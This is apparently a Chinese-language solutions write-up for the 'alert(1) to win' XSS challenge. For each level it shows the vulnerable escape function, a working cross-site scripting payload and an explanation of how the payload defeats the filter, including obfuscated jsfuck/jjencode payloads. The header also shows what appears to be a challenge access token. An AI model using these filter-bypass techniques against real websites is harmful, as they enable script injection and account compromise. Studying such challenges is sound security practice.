# alert(1) to win payloads

挑战地址：https://alf.nu/alert1

### 我还能更短！
### 所使用的浏览器 Opera 53.0.2907.99
### 对应的浏览器标识 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.99
https://alf.nu/alert(1)#accesstoken=NoNIWDnsKLzlDa2hkyRw

### 目录
> - [x]  <a href="#a001">Warmup (12)</a>
> - [x]  <a href="#a002">Adobe (14)</a>
> - [x]  <a href="#a003">JSON (27)</a>
> - [x]  <a href="#a004">JavaScript (15)</a>
> - [x]  <a href="#a005">Markdown (31)</a>
> - [x]  <a href="#a006">DOM (32)</a>
> - [x]  <a href="#a007">Callback (14)</a>
> - [x]  <a href="#a008">Skandia (52)</a>
> - [x]  <a href="#a009">Template (27)</a>
> - [x]  <a href="#a010">JSON 2 (35)</a>
> - [x]  <a href="#a011">Callback 2 (16)</a>
> - [x]  <a href="#a012">Skandia 2 (137)</a>
> - [x]  <a href="#a013">iframe</a>
> - [x]  <a href="#a014">TI(S)M (25)</a>
> - [x]  <a href="#a015">JSON 3 (29)</a>
> - [x]  <a href="#a016">Skandia 3 (137)</a>
> - [x]  <a href="#a017">RFC4627 (101)</a>
> - [x]  <a href="#a018">Well (85)</a>
> - [x]  <a href="#a019">No (36)</a>
> - [x]  <a href="#a020">K'Z'K (60)</a>
> - [x]  <a href="#a021">K'Z'K (84)</a>
> - [x]  <a href="#a022">K'Z'K (189)</a>
> - [x]  <a href="#a023">Fruit (26)</a>
> - [x]  <a href="#a024">Fruit 2 (26)</a>
> - [ ]  <a href="#a025">Fruit 3</a>
> - [ ]  <a href="#a026">Capitals</a>
> - [ ]  <a href="#a027">Quine</a>
> - [ ]  <a href="#a028">Entities</a>
> - [ ]  <a href="#a029">Entities 2</a>

<a id="a001"></a>
### Warmup (12)
```javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```
热身题，对参数`s`没有任何校验，直接上payload吧
```html
");alert(1);("
```
或者
```html
");alert(1);//
```
最短的话，12个字符
```html
");alert(1-"
```
或者
```html
");alert(1|"
```
天才般的Javascript（劝退）
```javascript
> 1 + ""
< "1"
> 1 - ""
< 1
```

<a id="a002"></a>
### Adobe (14)
```javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
全局替换了`"`为`\"`，就是说转义了双引号而没有转义转义字符`\`，也可以用`</script>`标签闭合，构造payload如下
```html
\");alert(1)//
```
或者
```html
</script><script>alert(1)//
```

<a id="a003"/></a>
### JSON (27)
```javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
使用了`JSON.stringify()`函数对`s`进行处理，该函数会对双引号`"`和转义字符`\`进行转义，没有对`< > ' /`进行处理。那么闭合script标签，创建一个新的script 标签来执行alert(1)，用`//`注释掉多余的字符串，payload如下
```html
</script><script>alert(1)//
```

<a name="a004"/></a>
### JavaScript (15)
```javascript
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```
这个有点意思，先上payload吧
```html
%22);alert(1)//
```
`url`是放到`a`标签的`href`属性中执行的，`href`属性用于指定超链接目标的URL，是支持URL编码的，`%22`是双引号`"`的URL编码，最后构造出的`a`标签为
```html
<a href=javascript:console.log("%22);alert(1)//")></a>
```
`a.click()`执行的时候触发了alert(1)

<a name="a005"/></a>
### Markdown (31)
```javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```
第一行代码将所有`< "`字符进行了转义
第二行是将形如`http://S+ `的字符串改写为
```html
<a href="http://S+">http://S+</a>
```
（S+为匹配一个非空白字符一次或多次）
第三行将形如`[[a|b]]`的字符串改写为 
```html 
<img alt="b" src="a.gif"> 
```
先放出payload
```html
[[a|http://onerror=alert(1)//]]
```
该函数构造的结果为
```html
<img alt="<a href="http://onerror1=alert(1)//" src="a.gif">">http://onerror=alert(1)//]]</a>
```
利用`//`来代替空格，href的起始`"`闭合alt的`"`，再用`//`注释掉最后的`"` 

<a name="a006"/></a>
### DOM (32)
```javascript
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```
通过`#`对字符串`s`进行切分，`document['create' + m[0]]`相当于调用了`document.createXXX()`函数,使用`document.createComment()`函数测试一下
```html
Comment#111111
```
Output
```html
<!--11111-->
```
那提前闭合注释标签，构造JavaScript代码就行了，payload如下
```html
Comment#--><img/onerror=alert(1) src=x/>
```
还可以缩短一下
```Html
Comment#><iframe/onload=alert(1)
```
Output
```html
<!--><iframe/onload=alert(1)-->
```
注：有一个更短的payload，29字符，但是在该网站上无法生效。
```html
Comment#><svg/onload=alert(1)
```
Output
```html
<!--><svg/onload=alert(1)-->
```
<a name="a007"/></a>
### Callback (14)
```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
和上一节很相似，输入
```html
aaaa#bbbb
```
第一个字段为`thing[0]`不允许有`a-z A-Z [ ] '`中其他字符出现，第二个字段`json`对字符`\ " <`进行了转义。按照程序的结果，本意应该是构造下面这种形式
Input
```html
Object#bbb
```
Ouput
```html
<script>Object({"userdata":"bbb"})</script>
```
但是注意到一个很奇怪的地方，`thing[0]`可以包含`[ ] '`这些字符，而`JSON.stringify()`不对`'`进行转义。知道这些构造payload的简单多了。
```html
'#'|alert(1)//
```
Output
```html
<script>'({"userdata":"'|alert(1)//"})</script>
```
<a name="a008"/></a>
### Skandia (52)
```javascript
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
`toUpperCase()`函数将小写字符转换为大写字符，`alert()`函数会变成`ALERT()`，无法执行。
可以采用HTML实体编码来绕过，参考<a target="_blank" href="http://www.w3school.com.cn/tags/html_ref_ascii.asp">HTML实体字符</a>，也可以用AAencode绕过，不过太长了
```javascript
</script><iframe/onload=&#97&#108&#101&#114&#116(1)>
```
Output
```html
<script>console.log("</SCRIPT><IFRAME/ONLOAD=&#97&#108&#101&#114&#116(1)>")</script></script>
```

<a name="a009"/></a>
### Template (29)
```javascript
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g, 
        function(_, n) { 
           return htmlEscape(args[n]);
         });
  }
  
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```
注入的地方在`<a href=#>{name}</a>`中的`{name}`字段，对`< > & " '`字符进行了转义，但是没有转义`\`字符，于是利用十六进制构建payload
```html
\x3ciframe/onload=alert(1)
```
Output
```html                                       
      <h2>Hello, <span id=name></span>!</h2>         
      <script>                                       
         var v = document.getElementById('name');    
         v.innerHTML = '<a href=#>\x3ciframe/onload=alert(1) </a>';       
      </script>                                   
```

<a name="a010"/></a>
### JSON 2 (35)
```javascript
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```
将 s 中的`" \`进行转义后，将`</script`替换为空串，（g: 全局查找，i：忽略大小写），用双写进行绕过
```html
<</script/script><script>alert(1)//
```
Output
```html
<script>console.log("</script><script>alert(1)//");</script>
```

<a name="a011"/></a>
### Callback 2 (16)
```javascript
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```
Callback的加强版本，转义了`/`，无法构造`//`注释了，如果了解 javascript 的注释是有三种的，分别为`// /**/ <!--`，那么利用第三种就可以轻松绕过了
```html
'#';alert(1)<!--
```
Output
```html
<script>'({"userdata":"';alert(1)<!--"})</script>
```

<a name="a012"/></a>
### Skandia 2 (137)
花了我两个小时才用137字符完成了这题。
```javascript
function escape(s) {
  if (/[<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
如果只是单纯的实现弹窗，那没什么困难的，但是不管使用aaencode还是jsfuck，用的字符都太多了，这两种编码形式写出的payload都超过了1000字符。如果图省事，那推荐使用<a href="http://utf-8.jp/public/jjencode.html" target="_blank">jjencode</a>，537个字符搞定
```javascript
");$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.__$+")"+"\"")())()//
```
但是看到很多人用100来个字符搞定有点不爽啊（80多个字符搞定的我真不知道怎么做到的），先上我的payload吧，再来分析
```html
");_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+'(1)')()//
```
首先来看有效的部分
```html
_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+'(1)')()
```
这段代码在console中输入可以执行`alert(1)`，来逐句分析一下
```html
_=!1+URL+!0
```
执行完毕后，`_="falsefunction URL() { [native code] }true"`(强制类型转换后进行字符串的拼接后的结果)，类似的全大写函数还有`CSS() JSON() `，这段代码给变量`_`赋予了一个字符串`"falsefunction URL() { [native code] }true"`，通过`_[num]`的形式我们可以取到这个字符串中num位置的字符。
```html
fill           =>    _[0]+_[10]+_[2]+_[2]
constructor    =>    _[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]
alert          =>    _[1]+_[2]+_[4]+_[38]+_[9]
```
那么简化后的代码为
```html
[]["fill"]["constructor"]("alert(1)")()
```
这段代码就变得易读了，要想理解就需要知道jsfuck的工作原理，查看<a href='https://github.com/aemkei/jsfuck#basics' target='_blank'>github.com/aemkei/jsfuck</a>
对应的给出firefox浏览器下的payload
```html
");_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[42]+_[43]+_[8]+_[9]+_[11]+_[42]](_[1]+_[2]+_[4]+_[42]+_[9]+'(1)')()//
```
原因是对于代码`_=!1+URL+!0`返回的字符串不一样
```html
"falsefunction URL() {
    [native code]
}true"
```

<a name="a013"/></a>
### iframe
```javascript
function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // https://4i.am/?...raw=... just outputs whatever you pass in.
  //
  // Alerting from 4i.am won't count.

  s = '<script>' + s + '<\/script>';
  tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.setAttribute('onload', 'youWon && alert(1)');
  return tag.outerHTML;
}
```

<a name="a014"/></a>
### TI(S)M (25)
```javascript
function escape(s) {
  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
  function html(s) { return s.replace(/[<>"&]/g, function(s) {
                        return '&#' + s.charCodeAt(0) + ';'; }); }

  return (
    '<script>' +
      'var url = ' + json(s) + '; // We\'ll use this later ' +
    '</script>\n\n' +
    '  <!-- for debugging -->\n' +
    '  URL: ' + html(s) + '\n\n' +
    '<!-- then suddenly -->\n' +
    '<script>\n' +
    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
    '  else new Image().src = url;\n' +
    '</script>'
  );
}
```
首先参考这篇 <a target="_blank" href="http://localhost/blog/index.php/archives/9/">在script标签中谈谈HTML注释<!-</a>，我们有两个可控的注入点，一是`json(s)`二是`html(s)`，前者转义了`" \ /"`字符，后者对`< > " &`进行了HTML编码。如果我们让s为`<!--<script>`
Output
```html
<script>var url = "<!--<script>"; // We'll use this later </script>

  <!-- for debugging -->
  URL: &#60;!--&#60;script&#62;

<!-- then suddenly -->
<script>
  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);
  else new Image().src = url;
</script>
```
保存本地执行，并在浏览器中审查元素不难发现，其对`<script>`标签的匹配产生了影响，有了3个起始标签而只有2个结束标签，并且一个`</script>`标签被注释掉了，调整得到
payload
```html
if(alert(1)/*<!--<script>
```

<a name="a015"/></a>
### JSON 3 (29)
```javascript
function escape(s) {
  return s.split('#').map(function(v) {
      // Only 20% of slashes are end tags; save 1.2% of total
      // bytes by only escaping those.
      var json = JSON.stringify(v).replace(/<\//g, '<\\/');
      return '<script>console.log('+json+')</script>';
      }).join('');
}
```
字符串`s`首先以字符`#`分割为字符串数组，然后对数组中的每一个字符串调用匿名函数，每一次调用返回类似`<script>console.log('+s[0]+')</script>`的字符串，然后再将其拼接。上一题谈过字符串`<!--<script>`会对标签的匹配产生影响，利用这一点首先尝试
```html
<!--<script>#aaa
```
Output
```html
<script>console.log("<!--<script>")</script><script>console.log("aaa")</script>
```
将其保存在本地，经过浏览器执行后，使用审查元素可以看到，原本的两个<script>标签被当成一个标签进行处理，由于`<!--`后面没有`-->`整个标签都没有得到执行，自然console也没有任何的报错信息。于是尝试
```html
<!--<script>#-->
```
Output
```html
<script>console.log("<!--<script>")</script><script>console.log("-->")</script>
```
保存本地执行，发现console如下报错
`Uncaught SyntaxError: Invalid regular expression: missing /`
这个告诉我们，标签的匹配没有了问题，但是在执行javascript代码的时候出现了语法错误，具体来看代码部分
```html
console.log("<!--<script>")</script><script>console.log("-->")
```
报错信息为：非法的正则表达式：缺少了 / ，也便是说`/script><script>console.log("-->")`这个部分被当做了javascript的正则表达式（其形式为`/.../`，需要注意在正则表达式中`()`也要成对出现）,于是构造payload
```html
<!--<script>#)/|alert(1)//-->
```
Output
```html
<script>console.log("<!--<script>")</script><script>console.log(")/|alert(1)//-->")</script>
```

<a name="a016"/></a>
### Skandia 3 (137)
```javascript
function escape(s) {
  if (/[\\<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```
payload
```html
");_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+'(1)')()//
```

<a name="a017"/></a>
### RFC4627 (101)
```javascript
function escape(text) {
  var i = 0;
  window.the_easy_but_expensive_way_out = function() { alert(i++) };

// "A JSON text can be safely passed into JavaScript's eval() function
// (which compiles and executes a string) if all the characters not
// enclosed in strings are in the set of characters that form JSON
// tokens."

  if (!(/[^,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]/.test(
          text.replace(/"(\\.|[^"\\])*"/g, '')))) {
    try { 
      var val = eval('(' + text + ')');
      console.log('' + val);
    } catch (_) {
      console.log('Crashed: '+_);
    }
  } else {
    console.log('Rejected.');
  }
}
```



<a name="a018"/></a>
### Well (79)
```javascript
function escape(s) {
  http://www.avlidienbrunn.se/xsschallenge/

  s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
  return "<script> var email = '" + s + "'; <\/script>";
}
```
绕过绕过，我给出的最短payload
```html
'|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|'
```
Output
```html
<script> var email = ''|new Function`a${'alert'+String.fromCharCode`40`+1+String.fromCharCode`41`}`|''; </script>
```


<a name="a019"/></a>
### No


----------


<a name="a020"/></a>
### K'Z'K
```javascript
// submitted by Stephen Leppik
function escape(s) {
    // remove vowels in honor of K'Z'K the Destroyer
    s = s.replace(/[aeiouy]/gi, '');
    return '<script>console.log("' + s + '");</script>';
}
```
采用匿名函数调用的方法，构造```[]["pop"]["constructor"]('alert(1)')()```的十六进制绕过，得到payload
```html
"|[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()|"
```
Output
```html
<script>console.log(""|[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()|"");</script>
```

<a name="a021"/></a>
### K'Z'K


----------


<a name="a022"/></a>**K'Z'K**


----------


<a name="a023"/></a>**Fruit**
